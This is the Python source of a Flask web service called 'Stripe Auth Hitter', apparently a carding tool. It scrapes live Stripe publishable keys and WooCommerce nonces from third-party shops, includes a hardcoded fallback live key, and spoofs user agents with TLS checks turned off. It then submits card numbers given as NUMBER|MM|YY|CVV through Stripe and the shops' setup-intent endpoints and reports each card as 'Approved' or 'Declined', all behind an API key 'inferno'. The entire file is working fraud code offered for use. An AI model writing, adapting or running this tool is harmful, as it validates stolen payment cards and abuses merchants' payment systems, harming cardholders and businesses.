from flask import Flask, jsonify, request
import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string
import os
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# Set up logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Store for mass check results
mass_check_results = {}
mass_check_status = {}

# Add a simple home page
@app.route('/')
def home():
    return jsonify({
        "name": "Stripe Auth Hitter",
        "developer": "Taisirshaik",
        "status": "active"
    })

def get_stripe_key(domain):
    logger.debug(f"Getting Stripe key for domain: {domain}")
    urls_to_try = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params"
    ]
    
    patterns = [
        r'pk_live_[a-zA-Z0-9_]+',
        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]'
    ]
    
    for url in urls_to_try:
        try:
            logger.debug(f"Trying URL: {url}")
            response = requests.get(url, headers={'User-Agent': UserAgent().random}, timeout=10, verify=False)
            if response.status_code == 200:
                for pattern in patterns:
                    match = re.search(pattern, response.text)
                    if match:                
                        key_match = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
                        if key_match:
                            logger.debug(f"Found Stripe key: {key_match.group(0)}")
                            return key_match.group(0)
        except Exception as e:
            logger.error(f"Error getting Stripe key from {url}: {e}")
            continue
    
    logger.debug("Using default Stripe key")
    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"

def extract_nonce_from_page(html_content, domain):
    logger.debug(f"Extracting nonce from {domain}")
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            logger.debug(f"Found nonce: {match.group(1)}")
            return match.group(1)
    
    logger.debug("No nonce found")
    return None

def process_card_enhanced(domain, ccx):
    logger.debug(f"Processing card for domain: {domain}")
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        logger.error("Invalid card format")
        return {
            "Response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "Status": "Declined",
            "Emoji": "❌"
        }
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = UserAgent().random
    stripe_mid = str(uuid.uuid4())
    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))

    session = requests.Session()
    session.headers.update({'User-Agent': user_agent})

    stripe_key = get_stripe_key(domain)

    payment_urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/my-account/"
    ]
    
    nonce = None
    for url in payment_urls:
        try:
            logger.debug(f"Trying to get nonce from: {url}")
            response = session.get(url, timeout=10, verify=False)
            if response.status_code == 200:
                nonce = extract_nonce_from_page(response.text, domain)
                if nonce:
                    break
        except Exception as e:
            logger.error(f"Error getting nonce from {url}: {e}")
            continue
    
    if not nonce:
        logger.error("Failed to extract nonce from site")
        return {"Response": "Failed to extract nonce from site", "Status": "Declined"}

    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'billing_details[address][postal_code]': '10080',
        'billing_details[name]': 'Sahil Pro',
        'pasted_fields': 'number',
        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent',
        'referrer': f'https://{domain}',
        'time_on_page': str(int(time.time()) % 100000),
        'key': stripe_key,
        '_stripe_version': '2024-06-20',
        'guid': str(uuid.uuid4()),
        'muid': stripe_mid,
        'sid': stripe_sid
    }

    try:
        logger.debug("Creating payment method")
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={
                'User-Agent': user_agent,
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            },
            timeout=15,
            verify=False
        )
        pm_data = pm_response.json()

        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            logger.error(f"Payment method error: {error_msg}")
            return {"Response": error_msg, "Status": "Declined", "Emoji": "❌"}

        payment_method_id = pm_data['id']
        logger.debug(f"Payment method created: {payment_method_id}")
    except Exception as e:
        logger.error(f"Payment Method Creation Failed: {e}")
        return {"Response": f"Payment Method Creation Failed: {str(e)}", "Status": "Declined", "Emoji": "❌"}
    
    endpoints = [
        {'url': f'https://{domain}/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
        {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {}},
        {'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 'params': {}}
    ]
    
    data_payloads = [
        {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        },
        {
            'action': 'wc_stripe_create_setup_intent',
            'payment_method_id': payment_method_id,
            '_wpnonce': nonce,
        }
    ]

    for endpoint in endpoints:
        for data_payload in data_payloads:
            try:
                logger.debug(f"Trying endpoint: {endpoint['url']} with payload: {data_payload}")
                setup_response = session.post(
                    endpoint['url'],
                    params=endpoint.get('params', {}),
                    headers={
                        'User-Agent': user_agent,
                        'Referer': f'https://{domain}/my-account/add-payment-method/',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': f'https://{domain}',
                        'x-requested-with': 'XMLHttpRequest',
                    },
                    data=data_payload,
                    timeout=15,
                    verify=False
                )
                                
                try:
                    setup_data = setup_response.json()
                    logger.debug(f"Setup response: {setup_data}")
                except:
                    setup_data = {'raw_response': setup_response.text}
                    logger.debug(f"Setup raw response: {setup_response.text}")
              
                if setup_data.get('success', False):
                    data_status = setup_data['data'].get('status')
                    if data_status == 'requires_action':
                        logger.debug("3D authentication required")
                        return {"Response": "3Ds Required", "Status": "Declined"}
                    elif data_status == 'succeeded':
                        logger.debug("Payment succeeded")
                        return {"Response": "Card Added ", "Status": "Approved"}
                    elif 'error' in setup_data['data']:
                        error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                        logger.error(f"Payment error: {error_msg}")
                        return {"Response": error_msg, "Status": "Declined", "Emoji": "❌"}

                if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    logger.error(f"Payment error: {error_msg}")
                    return {"Response": error_msg, "Status": "Declined", "Emoji": "❌"}

                if setup_data.get('status') in ['succeeded', 'success']:
                    logger.debug("Payment succeeded")
                    return {"Response": "Card Added", "Status": "Approved", "Emoji": "✅"}

            except Exception as e:
                logger.error(f"Setup error: {e}")
                continue

    logger.error("All payment attempts failed")
    return {"Response": "All payment attempts failed", "Status": "Declined", "Emoji": "❌"}

@app.route('/process')
def process_request():
    try:
        key = request.args.get('key')
        domain = request.args.get('site')
        cc = request.args.get('cc')
        
        logger.debug(f"Process request: key={key}, domain={domain}, cc={cc}")
        
        if key != "inferno":
            logger.error("Invalid API key")
            return jsonify({"error": "Invalid API key", "status": "Unauthorized", "Emoji": "❌"}), 401
        
        if not domain:
            logger.error("Missing domain")
            return jsonify({"error": "Missing domain parameter", "status": "Bad Request"}), 400
        
        # Clean domain - remove https:// if present
        if domain.startswith('https://'):
            domain = domain[8:]
        elif domain.startswith('http://'):
            domain = domain[7:]
            
        if not re.match(r'^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,6}$', domain):
            logger.error(f"Invalid domain: {domain}")
            return jsonify({"error": "Invalid domain format", "status": "Bad Request", "Emoji": "❌"}), 400
            
        if not cc or not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
            logger.error(f"Invalid card format: {cc}")
            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Bad Request", "Emoji": "❌"}), 400
        
        result = process_card_enhanced(domain, cc)
        
        # Ensure consistent response format
        return jsonify({
            "Response": result.get("Response", result.get("response", "Unknown response")),
            "Status": result.get("Status", result.get("status", "Unknown status"))
        })
    except Exception as e:
        logger.error(f"Process request error: {e}")
        return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error", "Emoji": "❌"}), 500

@app.route('/health')
def health_check():
    return jsonify({"status": "Active", "timestamp": time.time(), "Mode": "Fast ⚡"})

# For Vercel deployment
if __name__ == "__main__":
    app.run(debug=True)
